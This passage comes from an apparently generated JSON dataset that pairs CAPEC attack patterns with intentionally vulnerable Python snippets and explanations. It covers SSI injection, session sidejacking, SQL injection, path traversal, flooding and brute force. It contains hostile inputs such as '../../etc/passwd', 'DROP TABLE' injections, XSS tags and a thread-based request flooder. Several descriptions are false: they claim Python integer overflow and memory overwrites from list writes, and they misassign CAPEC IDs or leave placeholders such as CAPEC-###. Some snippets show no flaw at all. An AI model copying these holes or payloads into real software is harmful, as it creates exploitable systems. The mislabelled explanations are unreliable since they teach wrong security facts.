        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function `vulnerable_function` takes an input `data` and attempts to copy it into a fixed-size buffer of 10 bytes. However, there is no bounds checking to ensure that the input data fits within the buffer. If the input data exceeds the buffer size, it will write past the buffer's boundaries, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000 'Overflow Buffers' and is related to CWE-120 'Buffer Copy without Checking Size of Input'. The input `user_input` is deliberately set to 20 bytes, which is larger than the buffer size, to trigger the overflow."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET', 'POST'])\ndef vulnerable():\n    if request.method == 'POST':\n        user_input = request.form['user_input']\n        # Directly using user input in the template without sanitization\n        response = render_template_string(f\"<html><body>{user_input}</body></html>\")\n        return response\n    return '''<form method=\"post\">\n                  Input: <input type=\"text\" name=\"user_input\">\n                  <input type=\"submit\">\n              </form>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Server Side Include (SSI) Injection. The application has a single route '/vulnerable' that accepts both GET and POST requests. When a POST request is made, the user input is directly embedded into an HTML template using Flask's render_template_string function without any sanitization or validation. This lack of input validation and improper neutralization of special elements (CWE-97, CWE-74, CWE-20) allows an attacker to inject SSI directives or other malicious content. The code represents the main idea of CAPEC-97 by showing how an attacker can exploit such vulnerabilities to execute arbitrary code or access sensitive information on the server."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import http.client\nimport urllib.parse\n\n# Simulate a login request with credentials sent in cleartext\nconn = http.client.HTTPConnection('example.com')\nparams = urllib.parse.urlencode({'username': 'user', 'password': 'pass'})\nheaders = {'Content-type': 'application/x-www-form-urlencoded'}\nconn.request('POST', '/login', params, headers)\nresponse = conn.getresponse()\nprint(response.status, response.reason)\n\n# Simulate capturing a session token from the response headers\nsession_token = response.getheader('Set-Cookie')\nprint('Captured session token:', session_token)\n\n# Use the captured session token to perform an authenticated request\nheaders = {'Cookie': session_token}\nconn.request('GET', '/sensitive-data', headers=headers)\nresponse = conn.getresponse()\nprint(response.status, response.reason)\nprint(response.read().decode())\n\nconn.close()",
        "description": "This Python code snippet demonstrates a simplified version of a session sidejacking attack. It first sends a login request with credentials in cleartext (CWE-319, CWE-523) to a server using HTTP (not HTTPS). The response from the server includes a session token in the headers. The code captures this session token and uses it to make an authenticated request to access sensitive data, effectively bypassing authentication (CWE-294). This illustrates the vulnerability of transmitting sensitive information without encryption and the potential for session hijacking if session tokens are not adequately protected (CWE-614)."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <head>\n        <title>Clickjacking Example</title>\n    </head>\n    <body>\n        <h1>Welcome to the vulnerable site</h1>\n        <p>Click the button below:</p>\n        <button onclick=\"window.location.href='/action'\">Click me</button>\n    </body>\n    </html>\n    ''')\n\n@app.route('/action')\ndef action():\n    return \"Action performed!\"\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet creates a simple Flask web application that is vulnerable to clickjacking. The main page contains a button that, when clicked, redirects the user to the '/action' endpoint. The vulnerability arises because the application does not implement any frame-busting techniques, allowing an attacker to embed this page within an iframe on a malicious site. The attacker can then trick the user into clicking the button, unknowingly performing actions on the vulnerable site. This example embodies the main idea of CAPEC-111 (Clickjacking) and CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import webbrowser\n\n# CWE-250: Execution with Unnecessary Privileges\n# Running the browser with elevated privileges\nwebbrowser.open('http://example.com')\n\n# CWE-116: Improper Encoding or Escaping of Output\n# User input is directly included in the URL without proper encoding\nuser_input = \"<script>alert('XSS');</script>\"\nurl = f\"http://example.com/search?q={user_input}\"\nwebbrowser.open(url)\n\n# CWE-285: Improper Authorization\n# No authorization check before opening a potentially dangerous URL\nif user_input.startswith('http://') or user_input.startswith('https://'):\n    webbrowser.open(user_input)\n\n# CWE-20: Improper Input Validation\n# No validation on user input before using it in a URL\nwebbrowser.open(f\"http://example.com/{user_input}\")",
        "description": "This Python code snippet demonstrates a scenario where a web browser is opened with elevated privileges (CWE-250), and user input is improperly handled in multiple ways. The user input is directly included in the URL without proper encoding (CWE-116), no authorization checks are performed before opening potentially dangerous URLs (CWE-285), and there is no validation on the user input (CWE-20). This can lead to a Cross Zone Scripting attack, where an attacker can inject malicious scripts or content that bypass security zone controls, potentially gaining elevated privileges and executing harmful code."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass VulnerableHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        # Extracting user input from query parameters\n        user_input = self.path.split('?')[1] if '?' in self.path else ''\n        # Improper neutralization of CRLF sequences\n        response_header = f\"Set-Cookie: sessionId={user_input}\\r\\n\"\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.send_header('Set-Cookie', response_header)\n        self.end_headers()\n        self.wfile.write(b\"<html><body><h1>HTTP Request Splitting Example</h1></body></html>\")\n\nif __name__ == '__main__':\n    server = HTTPServer(('localhost', 8080), VulnerableHTTPRequestHandler)\n    print('Starting server at http://localhost:8080')\n    server.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP server that is susceptible to HTTP Request Splitting attacks. The server extracts user input from the URL query parameters and directly includes it in the 'Set-Cookie' HTTP header without properly neutralizing CRLF sequences. This improper neutralization (CWE-113) allows an attacker to inject CRLF characters, potentially splitting the HTTP request into multiple unauthorized requests. The code highlights the risk of improper handling of special elements (CWE-74, CWE-138) and inconsistent interpretation of HTTP requests (CWE-444), which can lead to security vulnerabilities in intermediary HTTP agents."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import logging\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    logging.info(f'User input: {user_input}')\n    return render_template_string(f'<p>{user_input}</p>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) through log files. The application logs user input directly to a log file and then renders it on a web page without proper sanitization. This embodies the main idea of the deprecated CAPEC 'XSS through Log Files' by showing how user input can be logged and then used in a web page, leading to potential XSS attacks. The related CWEs provide context on the vulnerabilities: CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-532 (Information Exposure Through Log Files)."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/trace', methods=['TRACE'])\ndef trace_method():\n    # CWE-693: Protection Mechanism Failure\n    # CWE-648: Incorrect Use of Privileged APIs\n    # CWE-79: Improper Neutralization of Input During Web Page Generation\n    # CWE-352: Cross-Site Request Forgery (CSRF)\n    # CWE-692: Incomplete Denylist to Cross-Site Scripting\n    response = make_response(request.data)\n    response.headers['Content-Type'] = 'message/http'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that includes a route to handle HTTP TRACE requests. The TRACE method is used to echo back the received request, which can expose sensitive information such as cookies and authentication headers. This is a demonstration of Cross Site Tracing (XST), where an attacker can exploit this functionality to steal session cookies and other credentials. The code also highlights several related weaknesses: CWE-693 (Protection Mechanism Failure) by not disabling the TRACE method, CWE-648 (Incorrect Use of Privileged APIs) by mishandling sensitive data, CWE-79 (Improper Neutralization of Input) by potentially reflecting malicious input, CWE-352 (CSRF) by not verifying the request's origin, and CWE-692 (Incomplete Denylist to XSS) by not properly sanitizing input."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import sqlite3\nimport os\n\n# Simulate user input\nuser_input = \"1; DROP TABLE users; --\"\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Vulnerable SQL query\nquery = f\"SELECT * FROM users WHERE id = {user_input}\"\ncursor.execute(query)\n\n# Fetch the result\nresult = cursor.fetchone()\n\n# Simulate using the result in an OS command\nif result:\n    os.system(f\"echo {result[0]}\")\n\nconn.close()",
        "description": "This Python code snippet demonstrates a vulnerability where user input is directly used in an SQL query without proper sanitization, leading to SQL Injection (CWE-89). The injected SQL command can manipulate the database, such as dropping a table. The result of the SQL query is then used in an OS command without proper validation, leading to OS Command Injection (CWE-78). This embodies the main idea of the CAPEC, where an attacker can inject data into the command line for execution through SQL Injection, and the malicious data is later used as command line arguments without proper validation."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\n\n# Database connection setup\nengine = create_engine('sqlite:///example.db')\nSession = sessionmaker(bind=engine)\nsession = Session()\n\n# User input\nuser_input = \"1 OR 1=1\"\n\n# Vulnerable ORM query\nquery = f\"SELECT * FROM users WHERE id = {user_input}\"\nresult = session.execute(query)\n\n# Process result\nfor row in result:\n    print(row)",
        "description": "This Python code snippet demonstrates a vulnerable Object Relational Mapping (ORM) injection scenario using SQLAlchemy, an ORM tool. The code sets up a database connection and a session, then constructs a SQL query using user input directly within the query string. This is a classic example of improper input validation (CWE-20) and improper neutralization of special elements in an SQL command (CWE-89). The user input '1 OR 1=1' is a common SQL injection payload that can manipulate the query to return all rows from the 'users' table, demonstrating how an attacker can exploit such vulnerabilities. The code highlights the importance of using parameterized queries or ORM-provided safe methods to prevent SQL injection attacks."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport sqlite3\n\n# Sample SOAP message with user input\nsoap_message = '''\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap:Body>\n    <GetUserInfo>\n      <UserId>1 OR 1=1</UserId>\n    </GetUserInfo>\n  </soap:Body>\n</soap:Envelope>\n'''\n\n# Parse the SOAP message\nroot = ET.fromstring(soap_message)\nuser_id = root.find('.//UserId').text\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Vulnerable SQL query construction\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\n# Execute the query\ntry:\n    cursor.execute(query)\n    result = cursor.fetchall()\n    print(result)\nexcept sqlite3.Error as e:\n    print(f\"An error occurred: {e}\")\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The SOAP message contains a user input field 'UserId' which is extracted and directly used to construct an SQL query without proper validation or parameter binding. This allows an attacker to inject malicious SQL code, such as '1 OR 1=1', which can manipulate the query to return all records from the 'users' table. The code also includes error handling that could potentially expose sensitive information about the database if an error occurs. This example embodies the main idea of CAPEC-### and related CWEs, highlighting the risks of improper input validation and SQL injection vulnerabilities."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n@app.route('/data', methods=['GET'])\ndef get_data():\n    # Simulated sensitive data\n    data = {'user': 'admin', 'password': 'secret'}\n    callback = request.args.get('callback')\n    if callback:\n        # Vulnerable to JSON Hijacking\n        response = f'{callback}({json.dumps(data)})'\n        return app.response_class(response, mimetype='application/javascript')\n    return jsonify(data)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to JSON Hijacking. The '/data' endpoint returns sensitive data in JSON format. If a 'callback' parameter is provided in the request, the server wraps the JSON data in a JavaScript function call, making it vulnerable to JSON Hijacking. This vulnerability arises because the server does not verify the origin or authenticity of the request (CWE-345, CWE-346), and it relies on client-side mechanisms to enforce security (CWE-602). An attacker can exploit this by including the endpoint in a malicious script on another domain, thereby bypassing the Same Origin Policy and stealing the sensitive data."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import random\nimport string\n\n# Weak password generation (CWE-521)\ndef generate_weak_password():\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(6))\n\n# Simulate a login function with weak authentication (CWE-1390)\ndef login(username, password):\n    stored_password = 'password123'  # Weak password (CWE-521)\n    if username == 'admin' and password == stored_password:\n        return True\n    return False\n\n# Brute force attack simulation (CAPEC-112)\ndef brute_force_attack():\n    username = 'admin'\n    attempts = 0\n    while attempts < 1000:  # No restriction on attempts (CWE-307)\n        password = generate_weak_password()\n        if login(username, password):\n            print(f'Successful login with password: {password}')\n            return\n        attempts += 1\n    print('Brute force attack failed')\n\nbrute_force_attack()",
        "description": "This Python code snippet demonstrates a brute force attack (CAPEC-112) on a system with several vulnerabilities. The `generate_weak_password` function creates weak passwords (CWE-521) using only lowercase letters and a fixed length. The `login` function simulates a login mechanism with weak authentication (CWE-1390) by checking a hardcoded weak password. The `brute_force_attack` function attempts to brute force the login by generating multiple weak passwords and trying them without any restriction on the number of attempts (CWE-307). This code highlights the risks associated with weak password policies, insufficient authentication mechanisms, and lack of protection against excessive authentication attempts."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate memory-mapped I/O register access\nclass MemoryMappedIO:\n    def __init__(self, address):\n        self.address = address\n        self.value = 0\n\n    def read(self):\n        return self.value\n\n    def write(self, value):\n        self.value = value\n\n# Simulate improper access control to memory-mapped I/O registers\nclass DeviceDriver:\n    def __init__(self):\n        self.registers = {\n            'CONTROL': MemoryMappedIO(0x1000),\n            'STATUS': MemoryMappedIO(0x1004)\n        }\n\n    def ioctl(self, command, value=None):\n        if command == 'READ_STATUS':\n            return self.registers['STATUS'].read()\n        elif command == 'WRITE_CONTROL':\n            self.registers['CONTROL'].write(value)\n        else:\n            raise ValueError('Invalid command')\n\n# Example usage\nif __name__ == '__main__':\n    driver = DeviceDriver()\n    # Improper access control: any user can write to CONTROL register\n    driver.ioctl('WRITE_CONTROL', 0xDEADBEEF)\n    # Read STATUS register\n    status = driver.ioctl('READ_STATUS')\n    print(f'STATUS register value: {status}')",
        "description": "This Python code snippet simulates a device driver that uses memory-mapped I/O registers to interact with hardware. The `DeviceDriver` class provides an `ioctl` method to read from and write to these registers. However, the code lacks proper access control, allowing any user to write to the CONTROL register, which can lead to unintended behavior. This demonstrates the concept of 'Interface Manipulation' by showing how improper access control to hardware interfaces can be exploited, aligning with CWE-1262 and CWE-782."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import hashlib\n\n# Weak authentication mechanism\nusers = {'admin': '5f4dcc3b5aa765d61d8327deb882cf99'}  # Password is 'password' hashed with MD5\n\n# Function to authenticate user\ndef authenticate(username, password):\n    hashed_password = hashlib.md5(password.encode()).hexdigest()\n    if username in users and users[username] == hashed_password:\n        return True\n    return False\n\n# Simulate an authentication attempt\nusername = 'admin'\npassword = 'password'\n\nif authenticate(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')\n\n# Brute force attack simulation\nfor i in range(1000):\n    if authenticate('admin', 'password' + str(i)):\n        print('Brute force successful')\n        break",
        "description": "This Python code snippet demonstrates a weak authentication mechanism vulnerable to multiple CWE issues related to Authentication Abuse. The `authenticate` function uses MD5 hashing, which is considered weak (CWE-1390). The user credentials are stored in a dictionary with the password hashed using MD5. The code does not implement measures to prevent excessive authentication attempts (CWE-307), making it susceptible to brute force attacks. The brute force attack simulation loop attempts to authenticate by appending numbers to the password, highlighting the lack of protection against such attacks. This snippet embodies the main idea of CAPEC-115: Authentication Abuse, by showing how an attacker can exploit weak authentication and lack of brute force protection to gain unauthorized access."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'admin': '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if users[username] == hashed_password:\n            return True\n    return False\n\n# Bypass authentication by directly setting a flag\nis_authenticated = False\n\n# Simulate an alternate path that bypasses authentication\nif 'bypass' in globals():\n    is_authenticated = True\nelse:\n    is_authenticated = authenticate('admin', 'password')\n\nif is_authenticated:\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates an authentication bypass vulnerability. The `authenticate` function checks if the provided username and password match the stored credentials. However, the code includes an alternate path that bypasses authentication by checking if a global variable 'bypass' exists. If 'bypass' is present, the `is_authenticated` flag is set to True, granting access without proper authentication. This represents CWE-288 (Authentication Bypass Using an Alternate Path or Channel) and CWE-305 (Authentication Bypass by Primary Weakness), as the authentication mechanism can be circumvented through an alternate path."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\n\n# Simulate an untrusted search path vulnerability\nsearch_path = os.getenv('UNTRUSTED_PATH', '/default/path')\n\n# Simulate exposure of sensitive information\nsensitive_info = 'SECRET_KEY=12345'\n\n# Write sensitive information to a file in the untrusted path\nwith open(os.path.join(search_path, 'config.txt'), 'w') as f:\n    f.write(sensitive_info)\n\n# Simulate debug mode exposing sensitive information\ndebug_mode = True\nif debug_mode:\n    print('Debug Mode: Sensitive Information:', sensitive_info)",
        "description": "This Python code snippet demonstrates a combination of vulnerabilities related to the CAPEC 'Excavation' by simulating an untrusted search path (CWE-426) and exposure of sensitive information (CWE-200, CWE-1243). The code sets a search path based on an environment variable, which could be controlled by an attacker. It then writes sensitive information to a file in this potentially untrusted path. Additionally, if the application is in debug mode, it prints the sensitive information, further exposing it to unauthorized actors. This snippet embodies the idea of an adversary probing the system to extract sensitive information that can be leveraged for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\n\n# Vulnerable server that sends sensitive information in cleartext\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(1)\n\nprint('Server is listening on port 12345...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    # Sending sensitive information in cleartext\n    sensitive_data = 'username=admin&password=secret'\n    client_socket.send(sensitive_data.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that sends sensitive information (username and password) in cleartext over a network connection. The server listens on port 12345 and sends the sensitive data to any client that connects. This embodies the main idea of the CAPEC 'Interception' by demonstrating how an adversary could monitor the data stream to gather sensitive information. The code also highlights CWE-319 (Cleartext Transmission of Sensitive Information) as the sensitive data is not encrypted, making it susceptible to interception."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import urllib.parse\n\ndef is_safe_input(user_input):\n    # Incomplete list of disallowed inputs\n    disallowed_inputs = ['<script>', '..', '%2E']\n    for disallowed in disallowed_inputs:\n        if disallowed in user_input:\n            return False\n    return True\n\n# Example of double encoding\nuser_input = '%252E%252E%252Fetc%252Fpasswd'  # Double encoded '../etc/passwd'\n\n# Decode the input once\ndecoded_input = urllib.parse.unquote(user_input)\n\n# Validate before filtering\nif is_safe_input(decoded_input):\n    # Decode the input again\n    final_input = urllib.parse.unquote(decoded_input)\n    print(f\"Processed input: {final_input}\")\nelse:\n    print(\"Input is not safe!\")",
        "description": "This Python code snippet demonstrates a vulnerability related to double encoding, as described in the CAPEC. The `is_safe_input` function checks if the input contains any disallowed strings, but the list is incomplete and does not account for double-encoded values. The `user_input` is a double-encoded string representing a path traversal attack. The code decodes the input once and then validates it, which is a mistake because the validation should occur after all decoding steps. If the input passes the incomplete validation, it is decoded again, potentially allowing a malicious payload to bypass the filter. This snippet highlights issues such as improper handling of alternate encoding (CWE-173), improper handling of URL encoding (CWE-177), and validating before filtering (CWE-181)."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "import os\n\nclass ProductionSystem:\n    def __init__(self):\n        self.debug_mode = os.getenv('DEBUG_MODE', 'False') == 'True'\n        self.security_token = self.generate_security_token()\n\n    def generate_security_token(self):\n        if self.debug_mode:\n            # Insecure token generation for debugging purposes\n            return 'DEBUG-TOKEN-1234'\n        else:\n            # Proper token generation for production\n            return 'PROD-TOKEN-5678'\n\n    def debug_info(self):\n        if self.debug_mode:\n            # Exposing sensitive information in debug mode\n            return 'Sensitive debug information'\n        else:\n            return 'No debug information available'\n\n# Simulate a production environment with debug mode enabled\nos.environ['DEBUG_MODE'] = 'True'\n\nsystem = ProductionSystem()\nprint(system.debug_info())\nprint(system.security_token)",
        "description": "This Python code snippet represents a production system that has a debug mode which can be enabled via an environment variable. When the debug mode is enabled, the system generates an insecure security token and exposes sensitive debug information. This embodies the main idea of CAPEC-0022 (Exploit Non-Production Interfaces) by demonstrating how an adversary could exploit a debug interface that is unintentionally enabled in a production environment. The related CWEs are represented by the insecure token generation (CWE-1270), revealing sensitive debug information (CWE-1295), and the presence of active debug code (CWE-489)."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class User:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\nclass Resource:\n    def __init__(self, name, sensitive_data):\n        self.name = name\n        self.sensitive_data = sensitive_data\n\n    def access_resource(self, user):\n        if user.role == 'admin':\n            return self.sensitive_data\n        else:\n            return 'Access Denied'\n\n# Example usage\nadmin_user = User('admin', 'admin')\nregular_user = User('user', 'user')\n\nresource = Resource('confidential', 'Top Secret Data')\n\n# Admin access\nprint(resource.access_resource(admin_user))  # Expected: 'Top Secret Data'\n\n# Regular user access\nprint(resource.access_resource(regular_user))  # Expected: 'Access Denied', but due to improper access control, it might expose sensitive data",
        "description": "This Python code snippet defines a simple user-role system and a resource with sensitive data. The `User` class has a role attribute, and the `Resource` class has a method `access_resource` that checks the user's role before granting access to sensitive data. The code demonstrates the concept of 'Privilege Abuse' by showing how improper access control (CWE-284) can lead to unauthorized access to sensitive information. The example usage shows that an admin user can access the sensitive data, while a regular user should be denied access. However, if the access control check is flawed, it could expose sensitive data to unauthorized users, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def vulnerable_function(input_data):\n    buffer = [0] * 10  # Fixed-size buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No bounds checking\n    return buffer\n\n# Example usage\ninput_data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]  # Input larger than buffer\nresult = vulnerable_function(input_data)\nprint(result)",
        "description": "This Python code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerable_function` takes `input_data` and attempts to copy its contents into a fixed-size buffer of 10 elements. However, there is no bounds checking to ensure that the input data fits within the buffer. If `input_data` is larger than the buffer, this will result in writing past the end of the buffer, potentially overwriting other memory locations. This embodies the main idea of the CAPEC, where the buffer space itself is the target of the attack, and the content placed in the buffer is immaterial. The code also touches on CWE-1285, as it does not validate the index or position when accessing the buffer."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import threading\n\n# Shared resource\nshared_counter = 0\n\n# Lock for synchronizing access to the shared resource\nlock = threading.Lock()\n\n# Function that increments the shared counter\ndef increment_counter():\n    global shared_counter\n    for _ in range(1000000):\n        with lock:\n            shared_counter += 1\n\n# Function that decrements the shared counter\ndef decrement_counter():\n    global shared_counter\n    for _ in range(1000000):\n        with lock:\n            shared_counter -= 1\n\n# Create threads\nthread1 = threading.Thread(target=increment_counter)\nthread2 = threading.Thread(target=decrement_counter)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Wait for threads to complete\nthread1.join()\nthread2.join()\n\nprint(f'Final value of shared_counter: {shared_counter}')",
        "description": "This Python code snippet demonstrates a scenario where a shared resource (shared_counter) is accessed by multiple threads. The shared resource is protected by a lock to ensure proper synchronization, which is crucial to prevent race conditions. The increment_counter function increments the shared_counter, while the decrement_counter function decrements it. Both functions use a lock to ensure that only one thread can modify the shared_counter at a time. This example embodies the main idea of CAPEC-132: 'Shared Resource Manipulation', and highlights CWE-662: 'Improper Synchronization'. Without proper synchronization, simultaneous access to the shared resource could lead to inconsistent or corrupted data."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import threading\nimport requests\n\n# URL to target\nurl = 'http://example.com'\n\n# Function to perform a single request\ndef flood_request():\n    try:\n        response = requests.get(url)\n        print(f'Response Code: {response.status_code}')\n    except requests.exceptions.RequestException as e:\n        print(f'Request failed: {e}')\n\n# Number of threads to simulate high volume of requests\nnum_threads = 1000\n\n# Create and start threads\nthreads = []\nfor _ in range(num_threads):\n    thread = threading.Thread(target=flood_request)\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a basic flooding attack by rapidly sending a large number of HTTP GET requests to a target URL using multithreading. The code creates 1000 threads, each making a request to the specified URL. This simulates a high volume of interactions with the target, potentially leading to resource exhaustion and denial of service. The code embodies the main idea of the CAPEC 'Flooding' attack, highlighting the lack of rate limiting and resource throttling (CWE-770) and the potential for uncontrolled resource consumption (CWE-400)."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/data/'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The function `read_file` takes a `file_path` as input and constructs a full path by joining it with a base directory (`/var/www/data/`). The code does not properly validate or sanitize the `file_path` input, allowing an attacker to use sequences like `../../` to traverse directories and access files outside the intended directory. In the example usage, the user input `../../etc/passwd` is used to attempt to read the system's password file, which should be restricted. This code embodies the main idea of the CAPEC by showing how insufficient input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\n\n@app.route('/files/<path:filename>', methods=['GET'])\ndef download_file(filename):\n    # CWE-276: Incorrect Default Permissions\n    directory = '/var/www/files'\n    try:\n        # CWE-425: Direct Request ('Forced Browsing')\n        return send_from_directory(directory, filename)\n    except Exception as e:\n        return str(e), 404\n\n@app.route('/list', methods=['GET'])\ndef list_directory():\n    # CWE-424: Improper Protection of Alternate Path\n    directory = '/var/www/files'\n    try:\n        # CWE-732: Incorrect Permission Assignment for Critical Resource\n        files = os.listdir(directory)\n        return '<br>'.join(files)\n    except Exception as e:\n        return str(e), 404\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates the concept of Directory Indexing (CAPEC-126). The application has two routes: '/files/<path:filename>' for downloading files and '/list' for listing the contents of a directory. The '/files/<path:filename>' route is vulnerable to CWE-425 (Direct Request) as it allows direct access to files without proper authorization checks. The '/list' route lists the contents of the directory, which can expose sensitive files and is an example of CWE-424 (Improper Protection of Alternate Path). Additionally, the directory permissions are not properly managed, representing CWE-276 (Incorrect Default Permissions) and CWE-732 (Incorrect Permission Assignment for Critical Resource). This code highlights how improper handling of directory paths and permissions can lead to security vulnerabilities."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "def add_numbers(a, b):\n    return a + b\n\n# Example usage\nmax_int = 2147483647  # Maximum value for a 32-bit signed integer\nresult = add_numbers(max_int, 1)\nprint(f\"Result: {result}\")",
        "description": "This Python code snippet demonstrates an integer overflow vulnerability. The function `add_numbers` takes two integers as input and returns their sum. The example usage shows adding 1 to the maximum value of a 32-bit signed integer (`2147483647`). This operation causes an integer overflow, resulting in an unexpected negative value due to the wraparound behavior of integers. This embodies the main idea of the CAPEC 'Integer Attacks' by exploiting the structure of integer variables to produce unintended results. The related CWE-190 (Integer Overflow or Wraparound) is directly illustrated here, as the calculation produces an overflow."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate untrusted input\nuntrusted_input = -1\n\n# Convert untrusted input to a pointer\nptr = ctypes.c_void_p(untrusted_input)\n\n# Dereference the pointer\ntry:\n    value = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_int)).contents.value\n    print(f'Dereferenced value: {value}')\nexcept ValueError as e:\n    print(f'Error: {e}')\nexcept Exception as e:\n    print(f'Unexpected error: {e}')",
        "description": "This Python code snippet demonstrates a pointer manipulation vulnerability. It simulates obtaining an untrusted input, converting it to a pointer, and then dereferencing that pointer. The untrusted input is set to -1, which is an invalid memory address. When the code attempts to dereference this pointer, it will likely cause an error or crash, representing CWE-822 (Untrusted Pointer Dereference) and CWE-476 (NULL Pointer Dereference). The code also includes exception handling to catch and print errors, which would occur due to the invalid pointer dereference. This snippet embodies the main idea of the CAPEC by showing how manipulating a pointer with an untrusted value can lead to unintended memory access and potential application crashes."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
